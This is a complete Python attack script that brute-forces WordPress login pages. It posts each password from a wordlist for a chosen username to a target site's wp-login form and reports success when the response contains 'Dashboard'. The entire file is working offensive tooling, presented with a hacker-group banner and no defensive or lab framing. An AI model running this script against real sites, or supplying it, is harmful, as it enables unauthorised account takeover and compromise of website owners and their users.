import requests
import os
import time
from colorama import init, Fore, Style
import threading
import argparse

banner = '''
 TTTTTTTTTTT    HHH     HHH    EEEEEEEEEEE   
     TTT        HHH     HHH    EEE           
     TTT        HHHHHHHHHHH    EEEEEEEEEEE   BRUTE-FORCER  
     TTT        HHHHHHHHHHH    EEE           
     TTT        HHH     HHH    EEEEEEEEEEE   
      Specially made for wp-login pages
            By AgentHackers
     
'''

def main():
    parser = argparse.ArgumentParser(description='Brute force WordPress login')
    parser.add_argument('-u', '--username', type=str, help='target username', required=True)
    parser.add_argument('-p', '--url', type=str, help='target website login page URL', required=True)
    parser.add_argument('-w', '--file', type=str, help='passwords list file path', required=True)
    args = parser.parse_args()

    url = args.url
    username = args.username
    dictionary = args.file
    os.system('clear')
    print(Fore.GREEN + banner + Style.RESET_ALL)
    time.sleep(1)
    print(f"{Fore.YELLOW}Connecting to the website...{Style.RESET_ALL}")
    time.sleep(1)
    print(f"{Fore.YELLOW}Starting brute force for the username: {username} on the target website {url}")
    time.sleep(1)
    print(f"{Fore.YELLOW}Sit back, relax, and drink a coffee while the magic happens")
    print(f"This could take a while{Style.RESET_ALL}")
    time.sleep(2)

    def login(username, password):
        data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log+In"
        }
        response = requests.post(url, data=data)
        if "Dashboard" in response.text:
            print(f"{Fore.GREEN}[+] Password for {username}: {password}{Style.RESET_ALL}")
            return True
        else:
            os.system('clear')
            print(Fore.GREEN + banner + Style.RESET_ALL)
            print(f"{Fore.YELLOW}Connecting to the website...{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Starting brute force for the username: {username} on the target website {url}")
            print(f"{Fore.YELLOW}Sit back, relax, and drink a coffee while the magic happens")
            print(f"This could take a while{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Trying {password} for {username}{Style.RESET_ALL}")
            return False

    class BruteForcer(threading.Thread):
        def __init__(self, username):
            threading.Thread.__init__(self)
            self.username = username
        
        def run(self):
            with open(dictionary, "r") as f:
                for line in f:
                    password = line.strip()
                    if login(self.username, password):
                        break

    threads = []

    thread = BruteForcer(username)
    thread.start()
    threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()
